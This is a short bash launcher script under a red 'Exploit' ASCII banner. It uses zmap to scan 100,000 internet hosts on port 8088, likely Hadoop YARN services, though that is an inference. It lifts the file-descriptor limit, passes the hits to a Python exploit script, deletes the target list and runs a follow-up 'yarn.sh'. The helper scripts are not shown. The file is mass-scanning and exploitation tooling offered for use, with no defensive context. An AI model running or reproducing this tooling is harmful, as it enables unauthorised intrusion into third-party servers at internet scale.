#!/bin/bash 
echo -e "${RED}                                               "
echo -e "${RED}___________              .__         .__  __   "
echo -e "${RED}\_   _____/__  _________ |  |   ____ |__|/  |_ "
echo -e "${RED} |    __)_\  \/  /\____ \|  |  /  _ \|  \   __ "
echo -e "${RED} |        \>    < |  |_> >  |_(  <_> )  ||  |  "
echo -e "${RED}/_______  /__/\_ \|   __/|____/\____/|__||__|  "
echo -e "${RED}        \/      \/|__|                         "

zmap -p8088 -omfu2.txt -N 100000
ulimit -n 999999
python tnxl.py mfu2.txt
rm -rf mfu2.txt
clear
sh yarn.sh

